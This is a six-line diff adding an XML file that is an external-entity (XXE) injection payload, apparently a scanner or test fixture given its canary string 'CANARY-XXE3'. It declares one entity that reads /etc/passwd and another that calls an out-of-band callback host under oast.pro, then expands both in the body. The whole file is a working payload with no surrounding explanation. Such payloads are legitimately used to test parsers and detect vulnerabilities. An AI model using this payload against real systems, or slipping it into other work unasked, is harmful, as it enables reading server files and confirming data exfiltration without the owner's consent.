@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<!DOCTYPE r [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY oob SYSTEM "http://xmlfile.d9j7ocsgtqkls609354g7qfi57qo6s8j6.oast.pro/x">
+]>
+<r>CANARY-XXE3 &xxe; &oob;</r>
